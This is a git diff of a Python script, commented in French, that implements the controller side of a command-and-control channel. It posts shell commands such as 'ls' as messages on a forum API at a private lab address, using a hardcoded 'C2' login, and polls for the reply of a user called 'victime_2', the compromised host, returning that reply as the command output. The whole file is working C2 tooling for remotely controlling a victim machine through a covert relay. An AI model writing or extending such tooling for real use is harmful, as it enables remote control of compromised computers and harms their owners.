@@ -1,70 +1,72 @@
 import requests
-import subprocess
-from datetime import datetime
+import time
 
-class forum:
-    def __init__(self, ip, port, user, password):
+class Forum:
+    def __init__(self, ip, port, user, password, name_victime="victime_2"):
         self.ip = ip
         self.port = port
         self.user = user
         self.password = password
         self.find = False
         self.num_commande = 1
+        self.name = name_victime
+
+        # dernier message connu
+        self.last = {'body': 'vide', 'id': 0, 'username': 'C2'}
 
     def generate_user_key(self):
+        # génère un token
         response = requests.post(
             f"http://{self.ip}:{self.port}/api/auth/login",
             json={"username": self.user, "password": self.password},
         )
         response.raise_for_status()
+        return response.json()["token"]
 
-        token = response.json()["token"]
-        return token
-
-    def execute(self,commande):
+    def execute(self, commande):
         self.find = False
-        #genere le token
         token = self.generate_user_key()
 
-        #envoie la commande
-        response = requests.post(
+        # 1. Récupère tous les messages pour connaître le dernier id de la victime
+        response = requests.get(
+            f"http://{self.ip}:{self.port}/api/messages",
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        messages = response.json()
+        last_id = max((m["id"] for m in messages if m["username"] == self.name), default=0)
+
+        # 2. Envoie la commande
+        requests.post(
             f"http://{self.ip}:{self.port}/api/messages",
             headers={"Authorization": f"Bearer {token}"},
             json={"body": commande},
         )
 
-        #attendre la repones et récupérer la dernier
-        last = {'body': 'vide', 'createdAt': '2000-01-22T17:15:13.611397', 'id': 0, 'username': 'C2'}
+        # Attendre une réponse de la victime avec un id > last_id
         while not self.find:
-
             response = requests.get(
                 f"http://{self.ip}:{self.port}/api/messages",
                 headers={"Authorization": f"Bearer {token}"},
             )
+            messages = response.json()
 
-            for message in response.json():
-                body = message["body"]
-                date = message["createdAt"]
-                username = message["username"]
-                id = message["id"]
+            for message in messages:
+                if message["username"] == self.name and message["id"] > last_id:
+                    # nouveau message trouvé
+                    self.last = message.copy()
+                    print("nouveau message trouvé :", self.last)
+                    self.find = True
+                    break
 
-                print(message)
-                if username == self.__class__.__name__:
-                    if datetime.fromisoformat(date) > datetime.fromisoformat(last['createdAt']):
-                        last = message.copy()
-                        print("coucou")
+            if not self.find:
+                print("not find, attente 10s...")
+                time.sleep(10)
 
-            print("fin")
-            print(last)
-
-            self.find = True
-        print(last)
+        # incrémente le compteur de commandes envoyées
         self.num_commande += 1
-        return last['body']
+        return self.last["body"]
 
 
-
-
-
-t = forum("192.168.56.1", 6000, "C2", "testtest")
-t.execute("ls")
+# utilisation
+victime_2 = Forum("192.168.56.1", 6000, "C2", "testtest", "victime_2")
+print(victime_2.execute("ls"))
